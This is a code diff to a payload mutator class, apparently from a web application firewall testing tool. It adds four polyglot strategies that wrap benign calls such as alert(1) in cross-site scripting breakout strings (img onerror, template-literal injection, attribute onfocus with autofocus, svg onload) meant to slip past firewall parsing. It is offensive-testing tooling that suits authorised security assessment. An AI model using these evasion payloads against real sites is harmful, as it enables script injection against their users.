@@ -580,6 +580,16 @@ class PayloadMutator:
                 ("sql_keyword_synonym", self._sql_keyword_synonym),
             ])
 
+        # ── Polyglot strategies (universal, safe) ──────────────────
+        # Cross-context payloads that test multiple parsing paths with
+        # one request. All use benign indicators only (alert, print, 1=1).
+        strategies.extend([
+            ("polyglot_html_js", self._polyglot_html_js),
+            ("polyglot_js_template", self._polyglot_js_template),
+            ("polyglot_attr_break", self._polyglot_attr_break),
+            ("polyglot_svg_onload", self._polyglot_svg_onload),
+        ])
+
         # ── Content-type confusion strategies (universal) ────────────
         # These don't transform the payload — they change how it's delivered.
         # Marked with _CT_CONFUSION prefix so mutate() adds metadata.
@@ -797,7 +807,53 @@ class PayloadMutator:
                 return new_result
         return result
 
-    # ── Content-type confusion implementations ────────────────────────
+    # ── Polyglot mutation implementations ─────────────────────────
+    # Cross-context payloads. Safe: benign indicators only.
+    # Smarter: one payload covers multiple WAF parsing paths.
+
+    def _polyglot_html_js(self, payload: str) -> str:
+        """HTML+JS polyglot: valid in both HTML attribute and JS contexts.
+
+        Wraps payload so it terminates an attribute, opens a new tag,
+        and executes JS — testing both the HTML parser and JS parser.
+        Safe: uses alert(1) / print() only.
+        """
+        # Extract the JS function call from the payload
+        fn_match = re.search(r'(alert|confirm|prompt|print)\s*\([^)]*\)', payload)
+        fn_call = fn_match.group(0) if fn_match else 'alert(1)'
+        return f'"><img src=x onerror={fn_call}>//'
+
+    def _polyglot_js_template(self, payload: str) -> str:
+        """JS template literal polyglot: exploits backtick contexts.
+
+        If the app puts user input inside a JS template literal,
+        this breaks out and executes. Tests template literal parsing.
+        """
+        fn_match = re.search(r'(alert|confirm|prompt|print)\s*\([^)]*\)', payload)
+        fn_call = fn_match.group(0) if fn_match else 'alert(1)'
+        return f'${{{fn_call}}}'
+
+    def _polyglot_attr_break(self, payload: str) -> str:
+        """Attribute breakout polyglot: breaks out of various attribute types.
+
+        Works in: href="...", value="...", onclick="...", style="..."
+        Tests how the WAF handles attribute boundary detection.
+        """
+        fn_match = re.search(r'(alert|confirm|prompt|print)\s*\([^)]*\)', payload)
+        fn_call = fn_match.group(0) if fn_match else 'alert(1)'
+        return f"' onfocus={fn_call} autofocus='"
+
+    def _polyglot_svg_onload(self, payload: str) -> str:
+        """SVG+onload polyglot: uses SVG context which many WAFs handle poorly.
+
+        SVG has its own namespace and parsing rules. WAFs that only
+        understand HTML miss SVG-specific event handlers.
+        """
+        fn_match = re.search(r'(alert|confirm|prompt|print)\s*\([^)]*\)', payload)
+        fn_call = fn_match.group(0) if fn_match else 'alert(1)'
+        return f'<svg/onload={fn_call}>//'
+
+    # ── Content-type confusion implementations ──────────────────────
     # These methods return a content_type string, NOT a mutated payload.
     # mutate() handles them specially: payload stays the same, delivery changes.
 
